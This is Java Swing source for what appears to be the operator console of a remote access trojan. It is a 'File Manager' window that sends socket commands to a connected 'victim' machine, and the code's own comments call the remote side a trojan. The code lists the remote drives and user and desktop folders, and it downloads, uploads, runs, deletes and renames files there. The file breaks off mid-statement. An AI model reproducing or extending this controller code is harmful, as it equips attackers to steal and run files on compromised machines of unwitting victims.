package New;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Component;
import java.awt.Font;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Locale;

import javax.swing.*;
import javax.swing.filechooser.FileSystemView;
import javax.swing.plaf.FontUIResource;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableCellRenderer;
import javax.swing.table.TableColumn;
import javax.swing.table.TableColumnModel;

public class File_Manager_VB {
	private  JFrame form ;
	private  JTable j; 
	private    JScrollPane sp;
    private  JPopupMenu popupMenu;
    private  JMenuItem menuItem_Run_File;
    private  JMenuItem Refresh_menuitem;
    private  JMenuItem Download_file;
    private  JMenuItem Test_Download_file;
    private  JMenuItem Upload_file;
    private  JMenuItem menuItemRemoveVictim;
    private  JMenuItem addFolder;
    private  String File_Seperator ="x";
    private  int Upload_Chunk = 0;
    private  int there_but_notsent=0;
    private  boolean exit_unstable = false;
	private  String Exe_Split = "fxf0x4x4x0fxf";
	private  String Exe_Ending = "c2x2824x828200x0c";
	private  String Jar_Split = "fxf0x4x4x0fxf";
	private  String Jar_Ending = "c2x2824x828200x0c";
	private  String sock = "";
    private  String title = "";
	private  JTextArea Dir ;
	private  String File_Sep = ""; 
	private  String YY="";
	public void re_enable(){
		Download_file.setEnabled(true);
		Download_file.repaint();
		Test_Download_file.setEnabled(true);
		Test_Download_file.repaint();
		Upload_file.setEnabled(true);
		Upload_file.repaint();
	}
	public File_Manager_VB(String ip){
		this.sock = ip;
	
	}
	public void Set_sock(String ip){
		sock = ip;
	}
	public void Set_File_Sep(String s){
		File_Sep = s;
	}
	public String Get_sock(){
		return sock ;
	}
	public void command(){
		
		  sock = title.replace("File Manager For : "  , "");
		Master.Send_Data("getalldrives" + Exe_Split + Exe_Ending,sock,false);
		Master.Send_Data("getdrives" + Exe_Split + Exe_Ending,sock,false);
	}
	 class CellRenderer implements TableCellRenderer {
		 
	        @Override
	        public Component getTableCellRendererComponent(JTable table,
	                Object value,
	                boolean isSelected,
	                boolean hasFocus,
	                int row,
	                int column) {
	 
	            TableColumn tb = j.getColumn("Image");
	            tb.setMaxWidth(60);
	            tb.setMinWidth(60);
	 
	            j.setRowHeight(60);
	 
	            return (Component) value;
	        }
	 
	    }
	public void yourAddRow(String str0,String str1, String str2, String str3 ){
		  DefaultTableModel Model = (DefaultTableModel) j.getModel();
			 
			 if(str0 == "#"){
				 //Drive icon
				// CellRenderer CellRenderer = new CellRenderer();
				// j.getColumn("Image").setCellRenderer(CellRenderer);
				 ImageIcon icon=new ImageIcon(Master.class.getResource("Drive.png"));
				 /*for(int row = 0;row < j.getRowCount();row++) {
					  for(int col = 0;col < j.getColumnCount();col++) {
						 
				 	    	if (Model.getValueAt(row, 1) == str1 || (Model.getValueAt(row, 1)).toString().contains(str1)){
				 	    		 // new MessageBox().infoBox(str1, str2);
				 	    		 //remo_row(str1,str2);
				 	    		  Model.addRow(new Object[]{icon,str1, str2, str3});
				 	    		 // Model.removeRow(row);
				 	    	}
				 	      }
				 	}*/
				  Model.addRow(new Object[]{icon,str1, str2, str3});
			 }else  if(str0 == "$"){
				 //Folder icon
				 ImageIcon icon=new ImageIcon(Master.class.getResource("folder.png"));
				  Model.addRow(new Object[]{icon,str1, str2, str3});
			 }else  if(str0 == "@"){
				 //File icon
				 ImageIcon icon=new ImageIcon(Master.class.getResource("file.png"));
				  Model.addRow(new Object[]{icon,str1, str2, str3});
			 }
			 for(int row = 0;row < Model.getRowCount();row++) {
				  for(int col = 0;col < Model.getColumnCount();col++) {
					  j.setRowHeight(row, 25);
					   
			 	      }
			 	}
			 TableColumnModel columnModel = j.getColumnModel();
			  columnModel.getColumn(0).setMaxWidth(25);
			  
			// setColumnWidths(j,0);
		 //IP is 2nd column
		   
		}
	public static void setColumnWidths(JTable table, int... widths) {
	    TableColumnModel columnModel = table.getColumnModel();
	    for (int i = 0; i < widths.length; i++) {
	        if (i < columnModel.getColumnCount()) {
	            columnModel.getColumn(i).setMaxWidth(widths[i]);
	        }
	        else break;
	    }
	}
	 private static  ArrayList<String> SplitString(String s){
		 String Word = "";
		 String YY = "";
		 String xx = "|||";
		 YY = xx.charAt(0)+ "" +xx.charAt(1);
	 ArrayList<String>Words = new ArrayList<String>();
	 if(s.contains(YY)==false){
		 Words.add(s);
		 
		
		 return Words;
			
	 }else{

		 for (int i = 0 ; i<s.length();i++){
			 if ((s.charAt(i) =='|')== false) {
				 Word += s.charAt(i);
			 }else{
				 if(Words.contains(Word)==false){
				 Words.add(Word);
				 
				}
				 Word = "";
			 }
		 }
			 
			 return Words;
			 
	 }
		   
	 }
	 private  ArrayList<String> SplitString_D(String s,String Delimeter){
		 String Word = "";
		 
		 String YY = Delimeter;
	 ArrayList<String>Words = new ArrayList<String>();
	 if(s.contains(YY)==false){
		 Words.add(s);
		 
		
		 return Words;
			
	 }else{

		 for (int i = 0 ; i<s.length();i++){
			 if ((s.charAt(i) =='|')== false) {
				 Word += s.charAt(i);
			 }else{
				 if(Words.contains(Word)==false){
				 Words.add(Word);
				 
				}
				 Word = "";
			 }
		 }
			 
			 return Words;
			 
	 }
		   
	 }
	 private  String convertSize(float iSize)
	 {
	   if (iSize <= 0.0F) {
	     return "0";
	   }
	   
	   String[] units = { "Bytes", "KB", "MB", "GB", "TB" };
	   int digitGroups = (int)(Math.log10(iSize) / Math.log10(1024.0D));
	   
	   return new java.text.DecimalFormat("#,##0.#")
	     .format(iSize / Math.pow(1024.0D, digitGroups)) + 
	     " " + units[digitGroups];
	 }
	public  void Perform_data(String Received){
		 form.setTitle("File Manager For : " + sock);
		 form.repaint();
		 String YY = "";
		 String xx = "|||";
		 YY = xx.charAt(0)+ "" +xx.charAt(1);
		 this.YY = YY;
		 String platformx = System.getProperty("os.name", "generic").toLowerCase(Locale.ENGLISH);
		 if ((platformx.indexOf("mac") >= 0) || (platformx.indexOf("darwin") >= 0)) {
			 
			 File_Seperator = ":";
		      } else if (platformx.indexOf("win") >= 0) {
		    	  File_Seperator = "\\";
		    		 
		      } else if (platformx.indexOf("nux") >= 0) {
		    	  File_Seperator = "/";
		    	 
		      } else {
		    	  File_Seperator = System.getProperty("path.separator");
		    	  if(File_Seperator !="/" || File_Seperator !="\\" || File_Seperator !=":"){
		    		  File_Seperator = System.getProperty("file.separator");
		    		  if(File_Seperator !="/" || File_Seperator !="\\" || File_Seperator !=":"){
		    			  File_Seperator = "/";
		    		  }
		    	  }
		      }
		//  System.out.println("here          " + Received );
			if (Received.isEmpty()==false){
				 
					Received = Received.replace("c2x2824x828200x0c", YY);
					//System.out.println("here          " + Received );
					  switch (SplitString(Received).get(0)){
					  
					  case "drive":
						//  Dir.setText(""+SplitString(Received).get(2)+"vvv"+SplitString(Received).get(3));
						  yourAddRow("#",SplitString(Received).get(2),SplitString(Received).get(3) + " Drive","N/A");
							 j.repaint();
							//sp = new JScrollPane(j); 
						    // sp.setBounds(5, 50, 990, 300); 
						     sp.repaint();
							 form.repaint();
						  
						  break;
					  case "get_usr_folder":
			
						  	Dir.setText(SplitString(Received).get(2) + File_Sep);
						 
							 j.repaint();
							 //sp = new JScrollPane(j); 
						     //sp.setBounds(5, 50, 990, 300); 
						     sp.updateUI();
							 form.repaint();
						  
						  break;
					  case "get_dsk_folder":
			
						  	Dir.setText(SplitString(Received).get(2) + File_Sep);
						 
							 j.repaint();
							 //sp = new JScrollPane(j); 
						     //sp.setBounds(5, 50, 990, 300); 
						     sp.updateUI();
							 form.repaint();
						  
						  break;	  	  
					  case "folderitem":
						 
						  yourAddRow("$",SplitString(Received).get(2),"File Folder","N/A");
						 
							 j.repaint();
							 //sp = new JScrollPane(j); 
						     //sp.setBounds(5, 50, 990, 300); 
						     sp.updateUI();
							 form.repaint();
						  
						  break;
						  
					  case "fileitem":
						  String filesizex = SplitString(Received).get(3);
						String file_type = "N/A";
						  try{
							  file_type = SplitString(Received).get(2).substring(SplitString(Received).get(2).lastIndexOf("."),SplitString(Received).get(2).length());
							 
						  }catch(Exception ex){
							  try{
								  file_type = SplitString(Received).get(2).substring(SplitString(Received).get(2).lastIndexOf("."),SplitString(Received).get(2).length()-1);
								 
							  }catch(Exception exx2){ }
						  }
						  yourAddRow("@",SplitString(Received).get(2),file_type + " File" ,filesizex);
						 
							 j.repaint();
							 //sp = new JScrollPane(j); 
						     //sp.setBounds(5, 50, 990, 300); 
						     sp.updateUI();
							 form.repaint();
						  
						  break;
					  case "flashaya" :
						    System.out.print(SplitString(Received).get(2));
							 yourAddRow("#",SplitString(Received).get(2),SplitString(Received).get(3),SplitString(Received).get(4));
							 j.repaint();
							 //sp = new JScrollPane(j); 
						     //sp.setBounds(5, 50, 990, 300); 
						     sp.updateUI();
							 form.repaint();
						  break;
					  case "kill_uns_up":
						  Upload_Chunk = 0;
							 exit_unstable = true;
							 
						  break;
					  case "actual_chunk_uupload":
						  String actual_uploaded=SplitString(Received).get(2).replace("fsfs", "");
						  int uploaded_there = Integer.parseInt(actual_uploaded);
						  Upload_Chunk = uploaded_there;
							 String progress_filePath_act =  SplitString(Received).get(4);
						  String new_filepath_act = SplitString(Received).get(5);  

						 	if(Upload_Chunk<get_max_chunks_number_uns(progress_filePath_act, new File(new_filepath_act))){
						
								try {
									split_uns_not_thread(progress_filePath_act,new File(new_filepath_act),true,Upload_Chunk);
								} catch (Exception e) {
									// new MessageBox().errorBox_nothread(e.getMessage(), "");
								}
							 }
						  break;
					  case "send_chunk_uupload":
						  
						  try{
				   
				 String numericx = SplitString(Received).get(3).replace("fsfs", ""); //becasue some times if only integer some times not sent 
				 Upload_Chunk = Integer.parseInt(numericx);
				 String progress_filePath =  SplitString(Received).get(4);
				 //Chunk_counter +=1;
				 save_Progress_downloader(progress_filePath + File_Seperator ,Upload_Chunk);
				 
				 String new_filepath = SplitString(Received).get(2); 
					//new MessageBox().infoBox(progress_filePath + "\n" +new_filepath , "");
				 if(Upload_Chunk<get_max_chunks_number_uns(progress_filePath, new File(new_filepath))){
					  split_uns_not_thread(progress_filePath,new File(new_filepath),true,Upload_Chunk);
				 }
				
			 
			   }catch(Exception x){
					 System.out.println("send_chunk_uns\n" +x.getMessage());
			   }
						  break;
					  case "no_actual_uupload":
						  try { String numericx = SplitString(Received).get(2).replace("fsfs", ""); //becasue some times if only integer some times not sent 
							 Upload_Chunk = Integer.parseInt(numericx);
							 String progress_filePath =  SplitString(Received).get(4);
							 //Chunk_counter +=1;
							 
							 save_Progress_downloader(progress_filePath + File_Seperator ,Upload_Chunk);
							 String new_filepath = SplitString(Received).get(6);  
							
							 	if(Upload_Chunk<get_max_chunks_number_uns(progress_filePath, new File(new_filepath))){
							 
									split_uns_not_thread(progress_filePath,new File(new_filepath),false,0);
								 }
						  } catch (Exception e) {
							//	new MessageBox().errorBox_nothread(e.getMessage() , "");
							}
						  break;
					  case "finished_upload_uns":
						  //done uploading and moving
							 if (Dir.getText().length()>0){
								  Dir.repaint();
								  get_row_index(); //clear jtable
								  sock = title.replace("File Manager For : "  , "");
			                	  Master.Send_Data("FileManager" + Exe_Split  + Dir.getText() + Exe_Split + Exe_Ending , sock,false);
							 }else{
								 get_row_index(); //clear jtable
								 Master.Send_Data("getalldrives" + Exe_Split + Exe_Ending,sock,false);
								 Master.Send_Data("getdrives" + Exe_Split + Exe_Ending,sock,false);
							 }
						  break;
					  case "filemanager":
						  get_row_index(); //clear jtable
						 try{
							 String rest_line =  Received.replace("filemanager"+YY, "");
							  System.out.println(rest_line);
							  String []DDFM =rest_line.split("FileManagerSplit-FileManagerSplit");
							  String files_line = "";
							  for (String s:DDFM){
								  if (s.contains("[Folder]")){
									  s = s.replace("[Folder]", "");
									  yourAddRow("$",s,"File Folder","N/A");
								  }else{
									  files_line = s ;
									  break;
								  }
								//  
							  }
							  String []DDFM2 =files_line.split("FileManager0Split");
							 
							  int rev = 0;
							  for (int i = 0 ; i < DDFM2.length; i++ ){
								  try{
									  
									  String filename = "";
									  String filesize ="";
									  if (rev ==0 ){
										  filename = DDFM2[i];
										  filesize =  DDFM2[i+1];
										  rev = 1;
									  } else if (rev ==1 ){
										  rev =0;
									  }
									  System.out.println("xxxxxxxxxxx          " + filename );
									  float number = (float) 0.0;
									  try{
										  number = Float.valueOf(filesize);
									  }catch(Exception ex){ }
									
									if(filename.length()>0){
										yourAddRow("@",filename,"File",convertSize(number));
									}
									
								  }catch(Exception e){
										 
									 }
								  
								
							  }
							  
							 
							  
							
							  j.repaint();
								 //sp = new JScrollPane(j); 
							     //sp.setBounds(5, 50, 990, 300); 
							     sp.updateUI();
								 form.repaint();
							  break;
							 
						 }catch(Exception e){
							 
						 }
						 
					  }
					
				 
					
				
			}
				
		
	}
	public void external_refresh(){
		 if (Dir.getText().length()>0){
			  Dir.repaint();
			  get_row_index(); //clear jtable
			  sock = title.replace("File Manager For : "  , "");
       	  Master.Send_Data("FileManager" + Exe_Split  + Dir.getText() + Exe_Split + Exe_Ending , sock,false);
		 }else{
			 get_row_index(); //clear jtable
			 Master.Send_Data("getalldrives" + Exe_Split + Exe_Ending,sock,false);
			 Master.Send_Data("getdrives" + Exe_Split + Exe_Ending,sock,false);
		 }
	}
	public  void Do_frame(){
		 form = new JFrame();
		 form.setName("File Manager For : " + sock);
		 form.setTitle("File Manager For : " + sock);
		 title = "File Manager For : " + sock;
		 form.setResizable(false);
		  
		 int widthx =  (int) Toolkit.getDefaultToolkit().getScreenSize().getWidth();
		 int heightx = (int) Toolkit.getDefaultToolkit().getScreenSize().getHeight();
	 
		 form.setBounds((widthx -500)/2,( heightx -430)/2, 500, 430);
		 form.setLayout(null);
		 Font font = new Font("Microsoft Sans Serif", Font.PLAIN, 12);
		 Dir = new JTextArea("");
		 Dir.setBounds(5, 5, 485, 65);
		 
		 JButton btnNext = new JButton("Back");
			btnNext.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent arg0) {
					//do here some stuff
					if(Dir.getText().length()< 4){
						  get_row_index(); //clear jtable
						  Dir.setText("");
						  command();
					}else{
						
						if (Dir.getText().contains("/")){
							int last_index = Dir.getText().lastIndexOf("/");
							 Dir.setText(Dir.getText().substring(0, last_index) );  
							int last_index2 = Dir.getText().lastIndexOf("/")  +1 ;
							 Dir.setText(Dir.getText().substring(0, last_index2) );  
							 //re command exe trojan 
							  Dir.repaint();
							  get_row_index(); //clear jtable
							  sock = title.replace("File Manager For : "  , "");
		                	  Master.Send_Data("FileManager" + Exe_Split  + Dir.getText() + Exe_Split + Exe_Ending , sock,false);

						}else if (Dir.getText().contains("\\")){
							int last_index = Dir.getText().lastIndexOf(("\\").charAt(0));
							 Dir.setText(Dir.getText().substring(0, last_index) );  
							int last_index2 = Dir.getText().lastIndexOf(("\\").charAt(0)) +1 ;
							 Dir.setText(Dir.getText().substring(0, last_index2) );  
							 //re command exe trojan 
							  Dir.repaint();
							  get_row_index(); //clear jtable
							  sock = title.replace("File Manager For : "  , "");
		                	  Master.Send_Data("FileManager" + Exe_Split  + Dir.getText() + Exe_Split + Exe_Ending , sock,false);

						}else if (Dir.getText().contains(":")){
							int last_index = Dir.getText().lastIndexOf((":").charAt(0));
							 Dir.setText(Dir.getText().substring(0, last_index) );  
							int last_index2 = Dir.getText().lastIndexOf((":").charAt(0)) +1 ;
							 Dir.setText(Dir.getText().substring(0, last_index2) );  
							 //re command exe trojan 
							  Dir.repaint();
							  get_row_index(); //clear jtable
							  sock = title.replace("File Manager For : "  , "");
		                	  Master.Send_Data("FileManager" + Exe_Split  + Dir.getText() + Exe_Split + Exe_Ending , sock,false);

						}
							                	  
					}
					
				}
			});
			btnNext.setBounds(5, 75, 100, 23);
			btnNext.setBackground(Color.WHITE);
			
			 JButton btnNext_Refresh = new JButton("Refresh");
			 btnNext_Refresh.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent arg0) {
						 if (Dir.getText().length()>0){
							  Dir.repaint();
							  get_row_index(); //clear jtable
							  sock = title.replace("File Manager For : "  , "");
		                	  Master.Send_Data("FileManager" + Exe_Split  + Dir.getText() + Exe_Split + Exe_Ending , sock,false);
						 }else{
							 get_row_index(); //clear jtable
							 Master.Send_Data("getalldrives" + Exe_Split + Exe_Ending,sock,false);
							 Master.Send_Data("getdrives" + Exe_Split + Exe_Ending,sock,false);
						 }
							

						 
					}
				});
			 btnNext_Refresh.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "refresh.png" )));
			 btnNext_Refresh.setBounds(90, 75, 100, 23);
			 btnNext_Refresh.setBorder(BorderFactory.createEmptyBorder(0, 0, 2, 20));
			 btnNext_Refresh.setBackground(Color.WHITE);
			 
			 
			 JButton btnNext_get_usr = new JButton("User Folder");
			 btnNext_get_usr.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent arg0) {
						  get_row_index(); //clear jtable
		                	  Master.Send_Data("get_usr_folder" + Exe_Split  + Exe_Ending , sock,false);
						 	

						 
					}
				});
			 btnNext_get_usr.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "user folder icon.png" )));
			 btnNext_get_usr.setBounds(195, 75, 110, 23);
			 btnNext_get_usr.setBorder(BorderFactory.createEmptyBorder(0, 0, 2, 20));
			 
			btnNext_get_usr.setBackground(Color.WHITE);
			 JButton btnNext_get_dsk = new JButton("Desktop Folder");
			 btnNext_get_dsk.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent arg0) {
						  get_row_index(); //clear jtable
		                	  Master.Send_Data("get_dsk_folder" + Exe_Split  + Exe_Ending , sock,false);
						 	

						 
					}
				});
			 btnNext_get_dsk.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "desktop folder icon.png" )));
			 btnNext_get_dsk.setBounds(310, 75, 130, 23);
			 btnNext_get_dsk.setBorder(BorderFactory.createEmptyBorder(0, 0, 2, 20));
			 btnNext_get_dsk.setBackground(Color.WHITE);
			 
			 
			DefaultTableModel model = new DefaultTableModel(){

     	         @Override
     	         public boolean isCellEditable(int row, int column) {
     	             //Only the third column
     	             return false;
     	         }
     	    	public Class<?> getColumnClass(int column) {
     	           switch(column) {
     	               
     	               case 0: return ImageIcon.class;
     	               default: return Object.class;
     	           	}
     	   				}
			};

			
			JPopupMenu popupMenu = new JPopupMenu();
		     menuItem_Run_File = new JMenuItem("Run Item");  
		     Refresh_menuitem = new JMenuItem("Delete Item");
		     Download_file = new JMenuItem("Download File(Chunks)"); 
		     Test_Download_file = new JMenuItem("Fast Download(Best)");
		     Upload_file = new JMenuItem("Upload File");
			menuItemRemoveVictim = new JMenuItem("Rename Item");
			addFolder = new JMenuItem("New Folder");
 
			menuItem_Run_File.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "desktop icon.png" )));
			Refresh_menuitem.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "recylce.png" )));
			Download_file.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "down arrow.png" )));
			Test_Download_file.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "download.png" )));	
			Upload_file.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "upload arrow.png" )));
			menuItemRemoveVictim.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "rename.png" )));
			
			addFolder.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "addfolder.png" )));
			
			btnNext.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "back.png" )));
	 
			btnNext.setBounds(5, 75, 80, 23);btnNext.setBorder(BorderFactory.createEmptyBorder(0, 0, 2, 20));
			
			
			menuItem_Run_File.setBackground(Color.WHITE);
			addFolder.setBackground(Color.WHITE);
			Refresh_menuitem.setBackground(Color.WHITE);
				Test_Download_file.setBackground(Color.WHITE);
				Upload_file.setBackground(Color.WHITE);
			Download_file.setBackground(Color.WHITE);
			    
			    menuItemRemoveVictim.setBackground(Color.WHITE);
			    
			
			
			
			popupMenu.add(menuItem_Run_File);
			popupMenu.add(addFolder);
			popupMenu.add(Refresh_menuitem);
			popupMenu.add(Test_Download_file);	
			popupMenu.add(Download_file);		
			popupMenu.add(Upload_file);
			popupMenu.add(menuItemRemoveVictim);
			
			ImageIcon icon=new ImageIcon("Drive.png");
		    Object[] columnNames = {"^.^","Drive / File / Folder", "Type / Ext.", "Size"}; 

			// adding it to JScrollPane 
	       /* for (String Col_name : columnNames){
	        	TableColumn Col = new TableColumn();
		        
		        model.addColumn(Col_name);
		        
	        }*/
	        model.setColumnIdentifiers(columnNames);
	      	j = new JTable(model); 
	      	 
	      	
	      	        
	        j.setBounds(5, 100, 485, 290); 
	        j.setComponentPopupMenu(popupMenu);
			 
	        
	        j.addMouseListener(new MouseAdapter() {
	            public void mouseClicked(MouseEvent me) {
	               if (me.getClickCount() == 2) {     // to detect doble click events
	                  JTable target = (JTable)me.getSource();
	                  int row = target.getSelectedRow(); // select a row
	                  int column = target.getSelectedColumn(); // select a column
	                  String selected_Value_double_click =j.getModel().getValueAt(row, 1).toString();
	                  String item_type =j.getModel().getValueAt(row, 2).toString();
	                  
	                  if (item_type.contains("Folder")||item_type.contains("Drive")){
	                 
	                	  
	                		 if(item_type.contains("null D") || Dir.getText().contains("/")){
	                			  Dir.setText(Dir.getText() + selected_Value_double_click + "/");  
			                	  Dir.repaint();
	                		 }else{
	                			  Dir.setText(Dir.getText() + selected_Value_double_click + (File_Sep).charAt(0) );  
			                	  Dir.repaint();
	                		 }
		                	
		                	 // System.out.print("here enter command : " + Dir.getText());
		                	  get_row_index(); //clear jtable
		                	  System.out.println("iam          " + sock );
		                	  sock = title.replace("File Manager For : "  , "");
		                	 // new MessageBox().infoBox("iam " + sock, "");
		                	  Master.Send_Data("FileManager" + Exe_Split  + Dir.getText() + Exe_Split + Exe_Ending , sock,false);
		                 
	                	  
	                 }
	                  
	                  
	               }
	            }
	         });
	        
	        
	    	btnNext.setIcon(new ImageIcon(Master.class.getResource("/some_icons/" + "back.png" )));
	   	 	btnNext.setBorder(BorderFactory.createEmptyBorder(0, 0, 2, 20));
		    btnNext.setLayout(null);
	        Refresh_menuitem.addActionListener(new ActionListener() {
	        	
	  				public void actionPerformed(ActionEvent event) {
	  					//do here some stuff
	  				 
	  				 if (JOptionPane.showConfirmDialog(form, 
	 			            "Are you sure you want to Delete Selected Item ?", "Close Window?", 
	 			            JOptionPane.YES_NO_OPTION,
	 			            JOptionPane.QUESTION_MESSAGE) == JOptionPane.YES_OPTION){
	  					int selectedRow = j.getSelectedRow();
						String selected_item = j.getModel().getValueAt(selectedRow, 1).toString();
						  sock = title.replace("File Manager For : "  , "");
						Master.Send_Data("delete"  +  Exe_Split+ Dir.getText() + selected_item    +  Exe_Split + Exe_Ending , sock,false);
	 			        }	 
	  				
	  				
	  					
	  		         
	  				}
	  			});
	  			
	        
	        
	        menuItem_Run_File.addActionListener(new ActionListener() {
	        	
				public void actionPerformed(ActionEvent event) {
					//do here some stuff
						int selectedRow = j.getSelectedRow();
						String selected_item = j.getModel().getValueAt(selectedRow, 1).toString();
						  sock = title.replace("File Manager For : "  , "");
						Master.Send_Data("execute"  +  Exe_Split+ Dir.getText() + selected_item    +  Exe_Split + Exe_Ending , sock,false);
		        		//Send_Data("openfm" + Exe_Split + Exe_Ending,selected_sock);
		        		
		         
				}
			}); 
	        menuItemRemoveVictim.addActionListener(new ActionListener() {
	        	
	   				public void actionPerformed(ActionEvent event) {
	   					//do here some stuff
	   						int selectedRow = j.getSelectedRow();
	   						String selected_item = j.getModel().getValueAt(selectedRow, 1).toString();
	   						  sock = title.replace("File Manager For : "  , "");
	   						  //rename
	   						String ren_to = selected_item;
	   						 
	   						ren_to = JOptionPane.showInputDialog("Rename Item",ren_to);
	   						if(ren_to.equals(selected_item)){
	   							new MessageBox().errorBox_nothread("The Same name [Old name] Entered" + "\n" + "Handler : Ignore event", "Same name entered");
	   						}else{
	   							if(ren_to.length() > 0){
	   								String Old_path =  Dir.getText() + selected_item ;
	   								String new_path_withoutname = Dir.getText();
	   								String new_name = ren_to;
	   								if(j.getModel().getValueAt(selectedRow, 2).toString().contains("Folder")){
	   									Master.Send_Data("renamefolder"  +  Exe_Split+ Old_path   +  Exe_Split + new_path_withoutname +   Exe_Split  + new_name + Exe_Split + Exe_Ending , sock,false);
	   								}else{
	   									Master.Send_Data("renamefile"  +  Exe_Split+ Old_path  +  Exe_Split + new_path_withoutname +   Exe_Split  + new_name + Exe_Split  + Exe_Ending , sock,false);
	   								}
	   								
	   							}
	   						}
	   					//	
	   		        		//Send_Data("openfm" + Exe_Split + Exe_Ending,selected_sock);
	   		        		
	   		         
	   				}
	   			});
	        
	        addFolder.addActionListener(new ActionListener() {
	        	
   				public void actionPerformed(ActionEvent event) {
   					//do here some stuff
   						 
   						  sock = title.replace("File Manager For : "  , "");
   						  //rename
   						String ren_to = "New Folder";
   						 
   						int exist_fold = 0;
   					  DefaultTableModel Model = (DefaultTableModel) j.getModel();
   					 for(int row = 0;row < j.getRowCount();row++) {
  					  for(int col = 0;col < j.getColumnCount();col++) {
  						 
  				 	    	if (Model.getValueAt(row, 1) == ren_to || (Model.getValueAt(row, 1)).toString().contains(ren_to)){
  				 	    		exist_fold +=1;
  				 	    	}
  				 	      }
  				 	} 
   						 if(exist_fold>0){
   							ren_to = "New folder (" + exist_fold + ")";
   							ren_to = JOptionPane.showInputDialog("New Folder Name",ren_to);
   							if(ren_to.length() > 0){
   							 
   								String new_path_withoutname = Dir.getText();
   								String new_name = ren_to;
   							 for(int row = 0;row < j.getRowCount();row++) {
   		  					  for(int col = 0;col < j.getColumnCount();col++) {
   		  						 
   		  				 	    	if (Model.getValueAt(row, 1) == new_name || (Model.getValueAt(row, 1)).toString().contains(new_name)){
   		  				 	    	exist_fold +=1;
   		  				 	    	break;
   		  				 	    	}
   		  				 	      }
   		  					 
   		  				 	} 
   							 	if (exist_fold>0){
   							 	ren_to = "New folder (" + exist_fold + ")";
   							 	}
   									Master.Send_Data("crefolder"   +  Exe_Split + new_path_withoutname +   Exe_Split  + ren_to + Exe_Split + Exe_Ending , sock,false);
   								 
   								
   							}
   						 }else{
   							ren_to = "New folder";
   							ren_to = JOptionPane.showInputDialog("New Folder Name",ren_to);
   							if(ren_to.length() > 0){
   							 
   								String new_path_withoutname = Dir.getText();
   								String new_name = ren_to;
   							 for(int row = 0;row < j.getRowCount();row++) {
   		  					  for(int col = 0;col < j.getColumnCount();col++) {
   		  						 
   		  				 	    	if (Model.getValueAt(row, 1) == new_name || (Model.getValueAt(row, 1)).toString().contains(new_name)){
   		  				 	  	exist_fold +=1;
   		  				 	  	break;
   		  				 	    	}
   		  				 	      }
   		  					 
   		  				 	} 
   							if (exist_fold>0){
   							 	ren_to = "New folder (" + exist_fold + ")";
   							 	}
   									Master.Send_Data("crefolder"   +  Exe_Split + new_path_withoutname +   Exe_Split  + ren_to + Exe_Split + Exe_Ending , sock,false);
   								 
   								
   							}
   						 }
   						
   						
   							
   						 
   					//	
   		        		//Send_Data("openfm" + Exe_Split + Exe_Ending,selected_sock);
   		        		
   		         
   				}
   			});
	        Download_file.addActionListener(new ActionListener() {
	        	
				public void actionPerformed(ActionEvent event) {
					//do here some stuff
						int selectedRow = j.getSelectedRow();
						String selected_item = j.getModel().getValueAt(selectedRow, 1).toString();
						if(j.getModel().getValueAt(selectedRow, 2).toString().contains("Folder")){
							new MessageBox().errorBox_nothread("The Selected item is Folder" + "\n" + "Handler : Ignore event", "Invalid Download item");
						}else{
							  sock = title.replace("File Manager For : "  , "");
								Master.Send_Data("downloadfile"  +  Exe_Split+ Dir.getText() + File_Sep + selected_item    +  Exe_Split + Exe_Ending , sock,false);
								Download_file.setEnabled(false);
								Download_file.repaint();
								Test_Download_file.setEnabled(false);
								Test_Download_file.repaint();
				        		//Send_Data("openfm" + Exe_Split + Exe_Ending,selected_sock);
				        		
						}
					
		         
				}
			});
	        Test_Download_file.addActionListener(new ActionListener() {
	        	
				public void actionPerformed(ActionEvent event) {
					//do here some stuff
						int selectedRow = j.getSelectedRow();
						String selected_item = j.getModel().getValueAt(selectedRow, 1).toString();
						  sock = title.replace("File Manager For : "  , "");
						  if(j.getModel().getValueAt(selectedRow, 2).toString().contains("Folder")){
								new MessageBox().errorBox_nothread("The Selected item is Folder" + "\n" + "Handler : Ignore event", "Invalid Download item");
							}else{
								Master.Send_Data("unstable_download_nothread" +  Exe_Split+ Dir.getText() + File_Sep + selected_item    +  Exe_Split + Exe_Ending , sock,false);
								//	Master.Send_Data("unstable_download"  +  Exe_Split+ Dir.getText() + File_Sep + selected_item    +  Exe_Split + Exe_Ending , sock);
									Test_Download_file.setEnabled(false);
									Test_Download_file.repaint();
									Download_file.setEnabled(false);
									Download_file.repaint();
					        		//Send_Data("openfm" + Exe_Split + Exe_Ending,selected_sock);
					        		
							}
					
		         
				}
			});  
	    	Upload_file.addActionListener(new ActionListener() {
	        	
				public void actionPerformed(ActionEvent event) {
					//do here some stuff
					 
						  sock = title.replace("File Manager For : "  , "");
						 do_upload();
					
		         
				}
			});
	        btnNext_Refresh.setFont(font);
	        btnNext.setFont(font);
			Dir.setFont(font);
			Dir.setEditable(false);
			 
			
			
			
			
		    form.addWindowListener(new java.awt.event.WindowAdapter() {
			    @Override
			    public void windowClosing(java.awt.event.WindowEvent windowEvent) {
			   
			    	 if (JOptionPane.showConfirmDialog(form, 
			            "Are you sure you want to close File Manager "+ sock +" window?", "Close Window?", 
			            JOptionPane.YES_NO_OPTION,
